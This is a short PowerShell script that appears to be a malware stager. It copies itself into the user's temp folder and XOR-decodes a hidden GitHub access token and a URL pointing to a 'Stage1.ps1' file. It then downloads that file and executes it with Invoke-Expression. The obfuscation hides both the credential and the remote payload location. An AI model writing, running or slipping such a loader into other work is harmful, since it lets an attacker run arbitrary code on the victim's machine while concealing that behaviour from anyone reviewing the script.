$src = $MyInvocation.MyCommand.Definition
$dst = Join-Path $env:TEMP 'x.ps1'
if ($src -ne $dst -and (Test-Path $src)) {
    Copy-Item $src $dst -Force -EA 0
}
$k=42;$d=[char[]]([byte[]](77,67,94,66,95,72,117,90,75,94,117,27,27,105,107,100,97,97,109,99,26,29,64,110,28,71,99,75,25,108,29,65,80,117,68,107,76,107,91,93,82,70,111,25,79,97,125,29,124,18,124,65,28,107,73,105,103,95,76,30,98,68,104,124,88,109,123,65,108,78,73,120,123,92,107,27,66,103,109,31,29,96,124,25,29,75,77,122,90,77,76,66,68)|%{$_ -bxor $k});$t=-join $d;$e=[char[]]([byte[]](66,94,94,90,89,16,5,5,75,90,67,4,77,67,94,66,95,72,4,73,69,71,5,88,79,90,69,89,5,88,69,94,75,70,72,67,70,70,83,31,7,89,65,79,94,73,66,5,110,88,79,75,71,5,73,69,68,94,79,68,94,89,5,121,94,75,77,79,27,4,90,89,27)|%{$_ -bxor $k});$u=-join $e;[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$h=@{};$h.Add("Authorization","token "+$t);$h.Add("Accept","application/vnd.github.raw+json");$r=Invoke-WebRequest -UseBasicParsing -Headers $h -Uri $u;[Text.Encoding]::UTF8.GetString($r.Content)|IEX
